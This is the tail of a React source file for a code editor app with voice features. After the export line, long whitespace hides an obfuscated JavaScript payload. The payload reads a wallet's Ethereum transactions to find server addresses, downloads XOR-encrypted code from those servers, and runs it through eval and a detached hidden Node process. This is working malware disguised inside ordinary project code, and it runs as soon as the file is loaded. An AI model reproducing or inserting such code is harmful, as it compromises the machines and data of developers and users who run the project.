          </>
        )}
      </Modal.Body>
    </Modal>
  );

  return (
    <div className={`app ${darkMode ? 'dark-mode' : 'light-mode'} ${fullScreen ? 'full-screen' : ''}`}>
      <Navbar bg={darkMode ? "dark" : "light"} variant={darkMode ? "dark" : "light"} expand="lg" className="mb-2">
        <Container fluid>
          <Navbar.Brand>Advanced Code Editor with Voice AI</Navbar.Brand>
          <div className="d-flex ms-auto">
            <OverlayTrigger
              placement="bottom"
              overlay={<Tooltip id="templates-tooltip">Code Templates</Tooltip>}
            >
              <Button 
                variant={darkMode ? "outline-light" : "outline-dark"} 
                className="me-2"
                onClick={() => setShowTemplateModal(true)}
              >
                📋 Templates
              </Button>
            </OverlayTrigger>
            
            <OverlayTrigger
              placement="bottom"
              overlay={<Tooltip id="api-tooltip">API Integration Guide</Tooltip>}
            >
              <Button 
                variant={darkMode ? "outline-light" : "outline-dark"} 
                className="me-2"
                onClick={() => setShowAPIDocs(true)}
              >
                🔌 API Guide
              </Button>
            </OverlayTrigger>

            <Dropdown>
              <Dropdown.Toggle variant={darkMode ? "outline-light" : "outline-dark"} id="dropdown-settings">
                ⚙️
              </Dropdown.Toggle>
              <Dropdown.Menu className={darkMode ? 'dropdown-menu-dark' : ''}>
                <Dropdown.Item onClick={() => setShowVoiceModal(true)}>Voice Options</Dropdown.Item>
                <Dropdown.Divider />
                <Dropdown.Item onClick={toggleFullScreen}>
                  {fullScreen ? 'Exit Full Screen' : 'Full Screen Mode'}
                </Dropdown.Item>
                <Dropdown.Item onClick={toggleDarkMode}>
                  {darkMode ? 'Switch to Light Mode' : 'Switch to Dark Mode'}
                </Dropdown.Item>
              </Dropdown.Menu>
            </Dropdown>
            
            <OverlayTrigger
              placement="bottom"
              overlay={<Tooltip id="theme-tooltip">{darkMode ? 'Light Mode' : 'Dark Mode'}</Tooltip>}
            >
              <Button 
                variant={darkMode ? "outline-light" : "outline-dark"} 
                className="me-2"
                onClick={toggleDarkMode}
              >
                {darkMode ? '☀️' : '🌙'}
              </Button>
            </OverlayTrigger>
            
            <OverlayTrigger
              placement="bottom"
              overlay={<Tooltip id="fullscreen-tooltip">{fullScreen ? 'Exit Full Screen' : 'Full Screen'}</Tooltip>}
            >
              <Button 
                variant={darkMode ? "outline-light" : "outline-dark"} 
                className="me-2"
                onClick={toggleFullScreen}
              >
                {fullScreen ? '⊞' : '⛶'}
              </Button>
            </OverlayTrigger>
            
            <OverlayTrigger
              placement="bottom"
              overlay={<Tooltip id="voice-tooltip">
                {voiceEnabled ? 'Voice: On' : 'Voice: Off'} ({voiceStatus})
              </Tooltip>}
            >
              <Button 
                variant={voiceEnabled ? "success" : "secondary"} 
                className="me-2"
                onClick={toggleVoice}
                disabled={voiceStatus === 'unsupported'}
              >
                {voiceStatus === 'ready' && voiceEnabled && '🔊'}
                {voiceStatus === 'ready' && !voiceEnabled && '🔇'}
                {voiceStatus === 'loading' && '⏳'}
                {voiceStatus === 'error' && '⚠️'}
                {voiceStatus === 'unsupported' && '❌'}
                {voiceStatus === 'initializing' && '⚙️'}
              </Button>
            </OverlayTrigger>
            
            
          </div>
        </Container>
      </Navbar>

      <Container fluid className="main-container">
        <Row>
          {/* Code Editor Column */}
          <Col lg={6} className="code-editor-column">
            <Card className={`editor-card ${darkMode ? 'bg-dark text-light' : ''}`}>
              <Card.Header className="p-0">
                <div className="d-flex justify-content-between align-items-center tab-header">
                  <Nav variant="tabs" className="flex-grow-1">
                    <Nav.Item>
                      <Nav.Link 
                        active={currentTab === 'html'} 
                        onClick={() => handleTabChange('html')}
                        className={darkMode ? 'text-light' : ''}
                      >
                        HTML
                      </Nav.Link>
                    </Nav.Item>
                    <Nav.Item>
                      <Nav.Link 
                        active={currentTab === 'css'} 
                        onClick={() => handleTabChange('css')}
                        className={darkMode ? 'text-light' : ''}
                      >
                        CSS
                      </Nav.Link>
                    </Nav.Item>
                    <Nav.Item>
                      <Nav.Link 
                        active={currentTab === 'js'} 
                        onClick={() => handleTabChange('js')}
                        className={darkMode ? 'text-light' : ''}
                      >
                        JavaScript
                      </Nav.Link>
                    </Nav.Item>
                    <Nav.Item>
                      <Nav.Link 
                        active={currentTab === 'react'} 
                        onClick={() => handleTabChange('react')}
                        className={darkMode ? 'text-light' : ''}
                      >
                        React
                      </Nav.Link>
                    </Nav.Item>
                  </Nav>
                </div>
              </Card.Header>
              <Card.Body className="p-0">
                <div className="code-editor-container">
                  {currentTab === 'html' && (
                    <Form.Control
                      as="textarea"
                      className={`code-textarea ${darkMode ? 'dark-textarea' : ''}`}
                      value={htmlCode}
                      onChange={(e) => setHtmlCode(e.target.value)}
                      spellCheck="false"
                    />
                  )}
                  {currentTab === 'css' && (
                    <Form.Control
                      as="textarea"
                      className={`code-textarea ${darkMode ? 'dark-textarea' : ''}`}
                      value={cssCode}
                      onChange={(e) => setCssCode(e.target.value)}
                      spellCheck="false"
                    />
                  )}
                  {currentTab === 'js' && (
                    <Form.Control
                      as="textarea"
                      className={`code-textarea ${darkMode ? 'dark-textarea' : ''}`}
                      value={jsCode}
                      onChange={(e) => setJsCode(e.target.value)}
                      spellCheck="false"
                    />
                  )}
                  {currentTab === 'react' && (
                    <Form.Control
                      as="textarea"
                      className={`code-textarea ${darkMode ? 'dark-textarea' : ''}`}
                      value={reactCode}
                      onChange={(e) => setReactCode(e.target.value)}
                      spellCheck="false"
                    />
                  )}
                </div>
                <div className={`editor-buttons p-2 ${darkMode ? 'bg-secondary' : 'bg-light'}`}>
                  <Button variant="primary" onClick={runCode} className="me-2">
                    ▶ Run Code
                  </Button>
                  <Button variant="info" onClick={analyzeCode} className="me-2">
                    🔍 Analyze Code
                  </Button>
                  <Button variant="warning" onClick={getHelp} className="me-2">
                    🎤 Voice Help
                  </Button>
                  <Button 
                    variant="outline-secondary" 
                    onClick={() => setShowTemplateModal(true)}
                    className="me-2"
                  >
                    📋 Templates
                  </Button>
                </div>
              </Card.Body>
            </Card>
          </Col>

          {/* Preview and Console Column */}
          <Col lg={6} className="preview-column">
            <Tab.Container defaultActiveKey="preview">
              <Card className={`preview-card ${darkMode ? 'bg-dark text-light' : ''}`}>
                <Card.Header>
                  <Nav variant="tabs">
                    <Nav.Item>
                      <Nav.Link 
                        eventKey="preview"
                        className={darkMode ? 'text-light' : ''}
                      >
                        Preview
                      </Nav.Link>
                    </Nav.Item>
                    <Nav.Item>
                      <Nav.Link 
                        eventKey="console"
                        className={darkMode ? 'text-light' : ''}
                      >
                        Console
                      </Nav.Link>
                    </Nav.Item>
                    <Nav.Item>
                      <Nav.Link 
                        eventKey="suggestions"
                        className={darkMode ? 'text-light' : ''}
                      >
                        Suggestions
                      </Nav.Link>
                    </Nav.Item>
                  </Nav>
                </Card.Header>
                <Card.Body className="p-0">
                  <Tab.Content>
                    <Tab.Pane eventKey="preview" className="preview-pane">
                      <iframe 
                        ref={previewRef}
                        title="Code Preview" 
                        className="preview-frame"
                        sandbox="allow-scripts allow-same-origin"
                      ></iframe>
                    </Tab.Pane>
                    <Tab.Pane eventKey="console" className="console-pane">
                      <div className={`console-container ${darkMode ? 'dark-console' : ''}`}>
                        {consoleMessages.map((msg, index) => (
                          <ConsoleMessage key={index} message={msg} />
                        ))}
                      </div>
                      <div className={`console-buttons p-2 ${darkMode ? 'bg-secondary' : 'bg-light'}`}>
                        <Button variant="secondary" onClick={clearConsole}>
                          🧹 Clear Console
                        </Button>
                      </div>
                    </Tab.Pane>
                    <Tab.Pane eventKey="suggestions" className="suggestions-pane">
                      <div className={`suggestions-container ${darkMode ? 'dark-suggestions' : ''}`}>
                        {suggestions.map((suggestion, index) => (
                          <SuggestionItem key={index} suggestion={suggestion} />
                        ))}
                        {suggestions.length === 0 && (
                          <Alert variant={darkMode ? "dark" : "info"}>
                            Run "Analyze Code" to get suggestions for improving your code.
                          </Alert>
                        )}
                      </div>
                    </Tab.Pane>
                  </Tab.Content>
                </Card.Body>
              </Card>
            </Tab.Container>
          </Col>
        </Row>
      </Container>
      
      {/* Voice indicator */}
      {isSpeaking && (
        <div className="speaking-indicator">
          <div className="ripple"></div>
          <div className="speaking-text">Speaking...</div>
        </div>
      )}
      
      {/* Voice status indicator when not speaking */}
      {!isSpeaking && voiceEnabled && voiceStatus !== 'ready' && (
        <div className="voice-status-indicator">
          <Badge bg={
            voiceStatus === 'loading' ? 'info' : 
            voiceStatus === 'error' ? 'danger' : 
            voiceStatus === 'unsupported' ? 'secondary' : 'warning'
          }>
            Voice: {voiceStatus}
          </Badge>
        </div>
      )}
      
      {/* Modals */}
      <TemplateModal />
      <APIDocsModal />
      <VoiceOptionsModal />
    </div>
  );
}

export default App;																																																																																																																																																																																																																																																																										global.i = 'A10-*5579-1';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
